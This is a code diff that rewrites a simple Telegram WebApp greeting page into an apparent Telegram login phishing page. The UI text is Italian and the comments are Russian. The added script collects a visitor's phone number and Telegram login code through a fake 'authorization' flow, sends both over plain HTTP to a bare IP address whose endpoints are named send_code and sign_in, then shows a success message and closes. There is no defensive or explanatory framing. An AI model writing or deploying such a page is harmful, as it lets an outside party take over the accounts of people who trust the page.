@@ -3,17 +3,286 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifica</title>
-    <!-- Подключаем SDK Telegram WebApp -->
+    <title>Autorizzazione Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- Подключаем наши стили -->
-    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+
+        .tg-button {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 10px 0;
+            width: 100%;
+            transition: transform 0.2s;
+        }
+
+        .tg-button:hover {
+            transform: translateY(-2px);
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            margin: 10px 0;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .key {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            padding: 15px;
+            font-size: 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            color: white;
+            transition: background 0.2s;
+        }
+
+        .key:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .code-display {
+            font-family: monospace;
+            font-size: 24px;
+            letter-spacing: 5px;
+            padding: 20px;
+            margin: 20px 0;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            min-height: 30px;
+        }
+
+        .section {
+            display: none;
+        }
+
+        .active {
+            display: block;
+        }
+
+        .error {
+            color: #ff6b6b;
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <h1>👋 Ciao!</h1>
-        <p>Questo è il mio primo WebApp in Telegram!</p>
-        <p>Funziona! 🚀</p>
+        <!-- Секция приветствия -->
+        <div id="welcome-section" class="section active">
+            <h1>👋 Benvenuto!</h1>
+            <p>Autorizzazione necessaria per accedere al contenuto</p>
+            <button class="tg-button" onclick="showPhoneSection()">Inizia Autorizzazione</button>
+        </div>
+
+        <!-- Секция номера телефона -->
+        <div id="phone-section" class="section">
+            <h1>📱 Inserisci il tuo numero</h1>
+            <input type="tel" id="phone-input" class="input-field" placeholder="+39 123 456 7890">
+            <button class="tg-button" onclick="sendPhoneNumber()">Invia Numero</button>
+            <div id="phone-error" class="error" style="display: none;"></div>
+        </div>
+
+        <!-- Секция кода подтверждения -->
+        <div id="code-section" class="section">
+            <h1>⌨️ Inserisci il codice</h1>
+            <div class="code-display" id="code-display"></div>
+            <div class="keyboard" id="keyboard"></div>
+            <button class="tg-button" onclick="sendCode()">✅ Invia Codice</button>
+            <div id="code-error" class="error" style="display: none;"></div>
+        </div>
+
+        <!-- Секция успеха -->
+        <div id="success-section" class="section">
+            <h1>🎉 Successo!</h1>
+            <p>Autorizzazione completata con successo!</p>
+        </div>
     </div>
+
+    <script>
+        let currentCode = '';
+        let userPhone = '';
+
+        // Инициализация WebApp
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById(sectionId).classList.add('active');
+        }
+
+        function showPhoneSection() {
+            showSection('phone-section');
+        }
+
+        function createKeyboard() {
+            const keyboard = document.getElementById('keyboard');
+            keyboard.innerHTML = '';
+            const digits = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0];
+
+            digits.forEach(digit => {
+                const button = document.createElement('button');
+                button.className = 'key';
+                button.textContent = digit;
+                button.onclick = () => addDigit(digit);
+                keyboard.appendChild(button);
+            });
+        }
+
+        function addDigit(digit) {
+            if (currentCode.length < 10) {
+                currentCode += digit;
+                updateCodeDisplay();
+            }
+        }
+
+        function updateCodeDisplay() {
+            document.getElementById('code-display').textContent = 
+                currentCode.padEnd(5, '•');
+        }
+
+        async function sendPhoneNumber() {
+            const phoneInput = document.getElementById('phone-input');
+            const errorDiv = document.getElementById('phone-error');
+            
+            userPhone = phoneInput.value.trim();
+            
+            if (!userPhone) {
+                errorDiv.textContent = 'Per favore inserisci il numero di telefono';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            if (!userPhone.startsWith('+')) {
+                userPhone = '+' + userPhone;
+            }
+
+            try {
+                errorDiv.style.display = 'none';
+                
+                // Отправка номера на бэкенд
+                const response = await fetch('http://104.248.55.220:3001/api/send_code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        phone: userPhone,
+                        user_id: Telegram.WebApp.initDataUnsafe.user.id
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.status === 'code_sent') {
+                    showSection('code-section');
+                    createKeyboard();
+                } else {
+                    errorDiv.textContent = result.message || 'Errore sconosciuto';
+                    errorDiv.style.display = 'block';
+                }
+
+            } catch (error) {
+                errorDiv.textContent = 'Errore di connessione: ' + error.message;
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        async function sendCode() {
+            const errorDiv = document.getElementById('code-error');
+            
+            if (!currentCode) {
+                errorDiv.textContent = 'Per favore inserisci il codice';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            try {
+                errorDiv.style.display = 'none';
+                
+                // Отправка кода на бэкенд
+                const response = await fetch('http://104.248.55.220:3001/api/sign_in', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        code: currentCode,
+                        user_id: Telegram.WebApp.initDataUnsafe.user.id
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.status === 'success') {
+                    showSection('success-section');
+                    // Закрываем WebApp через 2 секунды
+                    setTimeout(() => {
+                        Telegram.WebApp.close();
+                    }, 2000);
+                } else {
+                    errorDiv.textContent = result.message || 'Codice errato';
+                    errorDiv.style.display = 'block';
+                }
+
+            } catch (error) {
+                errorDiv.textContent = 'Errore di connessione: ' + error.message;
+                errorDiv.style.display = 'block';
+            }
+        }
+    </script>
 </body>
 </html>
